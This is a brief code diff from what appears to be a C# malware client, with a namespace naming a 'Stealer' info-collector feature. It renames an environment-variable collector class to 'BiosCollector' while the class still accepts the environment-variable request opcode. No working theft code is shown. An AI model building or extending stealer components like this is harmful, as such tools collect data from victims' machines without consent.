@@ -1,11 +1,11 @@
 ﻿using System.Collections;
 
 namespace Gloom.Client.Features.Stealer.InfoCollector;
-internal class EnvVarsCollector : FeatureBase
+internal class BiosCollector : FeatureBase
 {
 	public override Guid[] AcceptedOps => new Guid[] { OpCodes.EnvVarsRequest };
 
-	public EnvVarsCollector(IMessageSender sender) : base(sender)
+	public BiosCollector(IMessageSender sender) : base(sender)
 	{
 	}
 
